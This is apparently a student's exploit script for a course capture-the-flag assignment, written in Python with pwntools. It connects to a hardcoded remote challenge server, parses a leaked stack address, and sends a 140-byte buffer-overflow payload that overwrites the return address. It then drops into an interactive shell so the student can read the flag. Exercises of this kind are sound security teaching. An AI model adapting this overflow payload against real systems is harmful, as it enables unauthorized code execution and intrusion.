'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Pacecar Problem 8
File Description:  Used to print to the nc session

nc 165.22.46.243 7331
'''

from pwn import *
p=remote("165.22.46.243", 7331) # Used to open nc connection
resp=p.recvuntil(b"help ")
leak=p.recvuntil(b"\n")
#leak looks like "0xffbeea50\n"
intleak = int(leak,16)
print("This isn't vulerable")
print(b'This might help: ' + p32(intleak, endian="big"))
p.sendline(b'a'*140+p32(intleak))#for nice unprintable payloads
p.interactive()
#if you have a shell then you can now type `ls` and `cat flag`